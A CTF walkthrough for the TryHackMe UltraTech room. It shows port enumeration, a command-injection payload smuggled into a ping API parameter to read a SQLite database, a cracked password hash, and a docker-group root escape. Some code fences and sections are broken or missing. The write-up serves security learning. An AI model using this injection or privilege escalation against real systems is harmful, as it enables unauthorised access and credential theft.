[TryHackMe | UltraTech CTF](https://tryhackme.com/room/ultratech1)

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.

**[ Your Mission ]**

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have

is the company's name and their server's IP address.

**Start this room by hitting the "deploy" button on the right!**

Good luck and more importantly, have fun!

# Part 1

After enumerating the services and resources available on this machine, what did you discover?

### Setup ✅

```

### #1 Which software is using the port 8081?

```bash
8081/tcp open  http    syn-ack Node.js Express framework
```

```bash
node.js
```

### #2 Which other non-standard port is used?

Since on our first nmap scan we didn't find the port let's scan all the ports

```bash
➜  ~ TryHackMe nmap -A -vv -p- 10.10.124.2
```

```bash
31331/tcp open
```

### #3 Which software using this port?

```bash
apache
```

### #4 Which GNU/Linux distribution seems to be used?

```bash
ubuntu
```

### #5 The software using the port 8080 is a REST api, how many of its routes are used by the web application?

# Part 3

Now that you know which services are available, it's time to exploit them !

Did you find somewhere you could try to login ? Great !

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly..

### #1 There is a database lying around, what is its filename?

<div className="Image__Medium">
  <img src="https://imgur.com/tuO0kgU.png" alt="blog_image" />
</div>

```bash
➜  TryHackMe dirb http://10.10.124.2:31331/
```

```bash
➜  TryHackMe dirb http://10.10.124.2:31331/

```bash

<div className="Image__Medium">

</div>

As you can see there is some script on the bottom of the page

<div className="Image__Medium">
  <img src="https://imgur.com/bHSVNrk.png" alt="blog_image" />
</div>

```bash
function getAPIURL() {
return `${window.location.hostname}:8081`
function checkAPIStatus() {
const req = new XMLHttpRequest();
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

Let's try if we can ping something with the api

<div className="Image__Medium">
  <img src="https://imgur.com/k6dMvGz.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/NiZaChE.png" alt="blog_image" />
</div>

```bash
utech.db.sqlite
```

### #2 What is the first user's password hash?

After some tries, something cool happened, if we cat the database name we can see the user's password hash

```bash
http://10.10.124.2:8081/ping?ip=`cat%20utech.db.sqlite`
```

<div className="Image__Medium">
  <img src="https://imgur.com/BFY62ek.png" alt="blog_image" />
</div>

```bash
r00tf357a0c52799563c7c7b76c1e7543a32
```

### #3 What is the password associated with this hash?

Let's see if in the crack station database we can have the user's password

<div className="Image__Medium">
  <img src="https://imgur.com/ULh9XYu.png" alt="blog_image" />
</div>

Yep ! That worked 🤤

```bash
password : n100906
```

# Part 4

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

### #1 What are the first 9 characters of the root user's private SSH key?

We can try the api "/auth" 😵

<div className="Image__Medium">
  <img src="https://imgur.com/hQLygDy.png" alt="blog_image" />
</div>

```bash
http://10.10.124.2:8081/auth?login=r00t&password=n100906
```

<div className="Image__Medium">
  <img src="https://imgur.com/k8UD4e5.png" alt="blog_image" />
</div>

As you can see the is the group docker let's try something

[docker | GTFOBins](https://gtfobins.github.io/gtfobins/docker/)

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
